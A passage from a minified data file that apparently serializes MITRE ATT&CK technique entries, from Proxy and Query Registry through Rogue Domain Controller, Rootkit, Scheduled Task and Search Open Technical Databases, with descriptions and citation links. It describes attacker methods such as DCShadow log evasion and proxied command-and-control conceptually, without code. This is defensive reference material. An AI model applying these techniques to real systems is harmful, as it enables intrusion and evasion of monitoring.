JUL19",url:"https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fsecurity\u002Fnew-godlua-malware-evades-traffic-monitoring-via-dns-over-https\u002F",description:"Gatlan, S. (2019, July 3). New Godlua Malware Evades Traffic Monitoring via DNS over HTTPS. Retrieved March 15, 2020."},{url:f,description:g,source_name:h}],tactics:[o]},{id:be,"object-type":a,name:"Proxy",description:"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0040'\u003EHTRAN\u003C\u002Fa\u003E, ZXProxy, and ZXPortMap. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fin-depth-look-apt-attack-tools-of-the-trade\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",external_references:[{source_name:b,external_id:be,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1090"},{url:cY,description:cZ,source_name:c_},{url:f,description:g,source_name:h}],tactics:[o],subtechniques:[Bi,Bk,Bm,Bo]},{id:Bq,"object-type":a,name:"Query Registry",description:"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FWindows_Registry'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information can easily be queried using the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0075'\u003EReg\u003C\u002Fa\u003E utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1012'\u003EQuery Registry\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.",external_references:[{source_name:b,external_id:Bq,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1012"},{external_id:"CAPEC-647",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F647.html"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FWindows_Registry",description:"Wikipedia. (n.d.). Windows Registry. Retrieved February 2, 2015.",source_name:"Wikipedia Windows Registry"}],tactics:[i]},{id:Br,"object-type":a,name:"Redundant Access",description:"**This technique has been deprecated. Please use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1136'\u003ECreate Account\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1505\u002F003'\u003EWeb Shell\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E where appropriate.**\n\nAdversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. \n\nIf one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fmandiant-apt1-report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also retain access through cloud-based infrastructure and applications.\n\nUse of a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1100'\u003EWeb Shell\u003C\u002Fa\u003E is one such way to maintain access to a network through an externally accessible Web server.",external_references:[{source_name:b,external_id:Br,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1108"},{url:ai,description:aj,source_name:ak}],tactics:[d,k]},{id:Bs,"object-type":a,name:"Remote Access Software",description:"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fcontent\u002Fdam\u002Fsymantec\u002Fdocs\u002Fsecurity-center\u002Fwhite-papers\u002Fistr-living-off-the-land-and-fileless-attack-techniques-en.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nRemote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgo.crowdstrike.com\u002Frs\u002F281-OBQ-266\u002Fimages\u002F15GlobalThreatReport.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.crysys.hu\u002F2013\u002F03\u002Fteamspy\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Bs,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1219"},{url:"https:\u002F\u002Fwww.symantec.com\u002Fcontent\u002Fdam\u002Fsymantec\u002Fdocs\u002Fsecurity-center\u002Fwhite-papers\u002Fistr-living-off-the-land-and-fileless-attack-techniques-en.pdf",description:"Wueest, C., Anand, H. (2017, July). Living off the land and fileless attack techniques. Retrieved April 10, 2018.",source_name:"Symantec Living off the Land"},{url:"https:\u002F\u002Fgo.crowdstrike.com\u002Frs\u002F281-OBQ-266\u002Fimages\u002F15GlobalThreatReport.pdf",description:"CrowdStrike Intelligence. (2016). 2015 Global Threat Report. Retrieved April 11, 2018.",source_name:"CrowdStrike 2015 Global Threat Report"},{url:"https:\u002F\u002Fblog.crysys.hu\u002F2013\u002F03\u002Fteamspy\u002F",description:"CrySyS Lab. (2013, March 20). TeamSpy – Obshie manevri. Ispolzovat’ tolko s razreshenija S-a. Retrieved April 11, 2018.",source_name:"CrySyS Blog TeamSpy"}],tactics:[o]},{id:ds,"object-type":a,name:"Remote Service Session Hijacking",description:"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\n\nAdversaries may commandeer these sessions to carry out actions on remote systems. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1563'\u003ERemote Service Session Hijacking\u003C\u002Fa\u003E differs from use of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021'\u003ERemote Services\u003C\u002Fa\u003E because it hijacks an existing session rather than creating a new session using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002F@networksecurity\u002Frdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmatrix.org\u002Fblog\u002F2019\u002F05\u002F08\u002Fpost-mortem-and-remediations-for-apr-11-security-incident'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:ds,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1563"},{url:Bt,description:Bu,source_name:Bv},{source_name:Bw,url:Bx,description:By}],tactics:[x],subtechniques:[Bz,BB]},{id:ad,"object-type":a,name:"Remote Services",description:"Adversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ssh.com\u002Fssh'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fwindowsserver\u002Fee236407.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:ad,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021"},{external_id:bC,source_name:c,url:bD},{source_name:BD,url:BE,description:BF},{url:go,description:gp,source_name:gq}],tactics:[x],subtechniques:[BG,BI,BK,BP,BR,BT]},{id:BV,"object-type":a,name:"Remote System Discovery",description:"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0097'\u003EPing\u003C\u002Fa\u003E or \u003Ccode\u003Enet view\u003C\u002Fcode\u003E using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E. Adversaries may also use local host files (ex: \u003Ccode\u003EC:\\Windows\\System32\\Drivers\\etc\\hosts\u003C\u002Fcode\u003E or \u003Ccode\u003E\u002Fetc\u002Fhosts\u003C\u002Fcode\u003E) in order to discover the hostname to IP address mappings of remote systems. \n\nSpecific to macOS, the \u003Ccode\u003Ebonjour\u003C\u002Fcode\u003E protocol exists to discover additional Mac-based systems within the same broadcast domain.",external_references:[{source_name:b,external_id:BV,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1018"},{external_id:"CAPEC-292",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F292.html"},{source_name:ce,url:cf,description:cg}],tactics:[i]},{id:BW,"object-type":a,name:"Replication Through Removable Media",description:"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1091",external_id:BW}],tactics:[x,q]},{id:BX,"object-type":a,name:"Resource Hijacking",description:"Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and\u002For hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and\u002For cause affected machines to become unresponsive.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Flazarus-under-the-hood\u002F77908\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Servers and cloud-based\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.cloudsploit.com\u002Fthe-danger-of-unused-aws-regions-af0bf1b878fc'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fhildegard-malware-teamtnt\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F19\u002Fe\u002Finfected-cryptocurrency-mining-containers-target-docker-hosts-with-exposed-apis-use-shodan-to-find-additional-victims.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdditionally, some cryptocurrency mining malware kills off processes for competing malware to ensure it’s not competing for resources.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F20\u002Fi\u002Fwar-of-linux-cryptocurrency-miners-a-battle-for-resources.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:BX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1496"},{description:"GReAT. (2017, April 3). Lazarus Under the Hood. Retrieved April 17, 2019.",url:"https:\u002F\u002Fsecurelist.com\u002Flazarus-under-the-hood\u002F77908\u002F",source_name:"Kaspersky Lazarus Under The Hood Blog 2017"},{description:BY,url:BZ,source_name:B_},{source_name:fv,url:fw,description:fx},{source_name:"Trend Micro Exposed Docker APIs",url:"https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F19\u002Fe\u002Finfected-cryptocurrency-mining-containers-target-docker-hosts-with-exposed-apis-use-shodan-to-find-additional-victims.html",description:"Oliveira, A. (2019, May 30). Infected Containers Target Docker via Exposed APIs. Retrieved April 6, 2021."},{source_name:"Trend Micro War of Crypto Miners",url:"https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F20\u002Fi\u002Fwar-of-linux-cryptocurrency-miners-a-battle-for-resources.html",description:"Oliveira, A., Fiser, D. (2020, September 10). War of Linux Cryptocurrency Miners: A Battle for Resources. Retrieved April 6, 2021."}],tactics:[j]},{id:B$,"object-type":a,name:"Rogue Domain Controller",description:"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.dcshadow.com\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?page_id=1821'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.dcshadow.com\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F005'\u003ESID-History Injection\u003C\u002Fa\u003E and\u002For manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.dcshadow.com\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:B$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1207"},{url:"https:\u002F\u002Fwww.dcshadow.com\u002F",description:"Delpy, B. & LE TOUX, V. (n.d.). DCShadow. Retrieved March 20, 2018.",source_name:"DCShadow Blog"},{url:"https:\u002F\u002Fadsecurity.org\u002F?page_id=1821",description:"Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015.",source_name:"Adsecurity Mimikatz Guide"},{url:"https:\u002F\u002Fgithub.com\u002Fshellster\u002FDCSYNCMonitor",description:"Spencer S. (2018, February 22). DCSYNCMonitor. Retrieved March 30, 2018.",source_name:"GitHub DCSYNCMonitor"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms677626.aspx",description:"Microsoft. (n.d.). Polling for Changes Using the DirSync Control. Retrieved March 30, 2018.",source_name:"Microsoft DirSync"},{url:"https:\u002F\u002Fadds-security.blogspot.fr\u002F2018\u002F02\u002Fdetecter-dcshadow-impossible.html",description:"Lucand,G. (2018, February 18). Detect DCShadow, impossible?. Retrieved March 30, 2018.",source_name:"ADDSecurity DCShadow Feb 2018"}],tactics:[d]},{id:Ca,"object-type":a,name:"Rootkit",description:"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting\u002Fhooking and modifying operating system API calls that supply system information. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Favcenter\u002Freference\u002Fwindows.rootkit.overview.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F001'\u003ESystem Firmware\u003C\u002Fa\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FRootkit'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Rootkits have been seen for Windows, Linux, and Mac OS X systems. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.crowdstrike.com\u002Fblog\u002Fhttp-iframe-injecting-linux-rootkit\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Fasia-14\u002Fmaterials\u002FTsai\u002FWP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Ca,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1014"},{external_id:fN,source_name:c,url:fO},{url:"https:\u002F\u002Fwww.symantec.com\u002Favcenter\u002Freference\u002Fwindows.rootkit.overview.pdf",description:"Symantec. (n.d.). Windows Rootkit Overview. Retrieved December 21, 2017.",source_name:"Symantec Windows Rootkits"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FRootkit",description:"Wikipedia. (2016, June 1). Rootkit. Retrieved June 2, 2016.",source_name:"Wikipedia Rootkit"},{url:kB,description:kC,source_name:kD},{url:"http:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Fasia-14\u002Fmaterials\u002FTsai\u002FWP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf",description:"Pan, M., Tsai, S. (2014). You can’t see me: A Mac OS X Rootkit uses the tricks you haven't known yet. Retrieved December 21, 2017.",source_name:"BlackHat Mac OSX Rootkit"}],tactics:[d]},{id:W,"object-type":a,name:"Scheduled Task\u002FJob",description:"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc785125.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions\u002Fprivileges).",external_references:[{source_name:b,external_id:W,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053"},{external_id:"CAPEC-557",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F557.html"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc785125.aspx",description:"Microsoft. (2005, January 21). Task Scheduler and security. Retrieved June 8, 2016.",source_name:"TechNet Task Scheduler Security"}],tactics:[p,k,u],subtechniques:[Cb,Cd,Cr,Cw,Cy,CA,CC]},{id:CE,"object-type":a,name:"Scheduled Transfer",description:"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1041'\u003EExfiltration Over C2 Channel\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1048'\u003EExfiltration Over Alternative Protocol\u003C\u002Fa\u003E.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1029",external_id:CE}],tactics:[J]},{id:CF,"object-type":a,name:"Screen Capture",description:"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as \u003Ccode\u003ECopyFromScreen\u003C\u002Fcode\u003E, \u003Ccode\u003Exwd\u003C\u002Fcode\u003E, or \u003Ccode\u003Escreencapture\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fdotnet\u002Fapi\u002Fsystem.drawing.graphics.copyfromscreen?view=netframework-4.8'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F01\u002Fnew-mac-backdoor-using-antiquated-code\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n",external_references:[{source_name:b,external_id:CF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1113"},{external_id:"CAPEC-648",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F648.html"},{source_name:"CopyFromScreen .NET",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fdotnet\u002Fapi\u002Fsystem.drawing.graphics.copyfromscreen?view=netframework-4.8",description:"Microsoft. (n.d.). Graphics.CopyFromScreen Method. Retrieved March 24, 2020."},{url:ct,description:cu,source_name:cv}],tactics:[m]},{id:CG,"object-type":a,name:"Scripting",description:"**This technique has been deprecated. Please use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059'\u003ECommand and Scripting Interpreter\u003C\u002Fa\u003E where appropriate.**\n\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1086'\u003EPowerShell\u003C\u002Fa\u003E but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1193'\u003ESpearphishing Attachment\u003C\u002Fa\u003E and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1203'\u003EExploitation for Client Execution\u003C\u002Fa\u003E, where adversaries will rely on macros being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.metasploit.com'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, Veil \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.veil-framework.com\u002Fframework\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, and PowerSploit \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fmattifestation\u002FPowerSploit'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.crowdstrike.com\u002Fdeep-thought-chinese-targeting-national-security-think-tanks\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:CG,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1064"},{source_name:"Metasploit_Ref",description:"Metasploit. (n.d.). Retrieved December 4, 2014.",url:"http:\u002F\u002Fwww.metasploit.com"},{url:"https:\u002F\u002Fwww.veil-framework.com\u002Fframework\u002F",description:"Veil Framework. (n.d.). Retrieved December 4, 2014.",source_name:"Veil_Ref"},{url:bN,description:bO,source_name:bP},{url:"https:\u002F\u002Fblog.crowdstrike.com\u002Fdeep-thought-chinese-targeting-national-security-think-tanks\u002F",description:"Alperovitch, D. (2014, July 7). Deep in Thought: Chinese Targeting of National Security Think Tanks. Retrieved November 12, 2014.",source_name:"Alperovitch 2014"},{url:"https:\u002F\u002Fwww.uperesia.com\u002Fanalyzing-malicious-office-documents",description:"Felix. (2016, September). Analyzing Malicious Office Documents. Retrieved April 11, 2018.",source_name:"Uperesia Malicious Office Documents"}],tactics:[d,p]},{id:dt,"object-type":a,name:"Search Closed Sources",description:"Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical\u002Fthreat intelligence data.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fd3security.com\u002Fblog\u002F10-of-the-best-open-source-threat-intelligence-feeds\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.zdnet.com\u002Farticle\u002Fa-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:dt,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1597"},{source_name:CH,url:CI,description:CJ},{source_name:CK,url:CL,description:CM}],tactics:[l],subtechniques:[CN,CP]},{id:aE,"object-type":a,name:"Search Open Technical Databases",description:"Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains\u002Fcertificates as well as public collections of network data\u002Fartifacts gathered from traffic and\u002For scans.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.whois.net\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdnsdumpster.com\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.circl.lu\u002Fservices\u002Fpassive-dns\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca 